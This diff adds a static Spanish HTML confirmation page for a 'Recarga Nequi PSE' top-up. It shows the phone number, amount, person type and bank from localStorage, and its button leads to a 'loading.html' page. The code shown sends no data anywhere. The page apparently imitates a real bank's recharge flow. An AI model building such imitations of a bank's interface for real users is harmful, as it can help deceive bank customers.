@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+<title>Revisa la info</title>
+<link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+
+<div class="container">
+
+<img src="logo.svg" class="logo">
+
+<h2 class="title">Revisa la info</h2>
+
+<div class="card">
+
+<p class="label">Concepto</p>
+<p>Recarga Nequi PSE</p>
+
+<p class="label">Número de celular</p>
+<p id="telefono"></p>
+
+<p class="label">¿Cuánto?</p>
+<p id="monto"></p>
+
+<p class="label">Tipo de persona</p>
+<p id="persona"></p>
+
+<p class="label">Banco</p>
+<p id="banco"></p>
+
+</div>
+
+<button class="btn active" id="recargarBtn">Recargar</button>
+<button class="btn-outline" id="btnAtras">Atrás</button>
+
+</div>
+
+<script>
+const telefono = localStorage.getItem("telefono") || "";
+const monto = localStorage.getItem("monto") || "";
+const persona = localStorage.getItem("persona") || "";
+const banco = localStorage.getItem("banco") || "";
+
+function formatear(num) {
+return num.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+}
+
+document.getElementById("telefono").innerText = telefono;
+document.getElementById("monto").innerText = monto ? "$" + formatear(monto) : "";
+document.getElementById("persona").innerText = persona;
+document.getElementById("banco").innerText = banco;
+
+document.getElementById("recargarBtn").addEventListener("click", () => {
+window.location.href = "loading.html";
+});
+
+document.getElementById("btnAtras").addEventListener("click", () => {
+history.back();
+});
+</script>
+
+</body>
+</html>
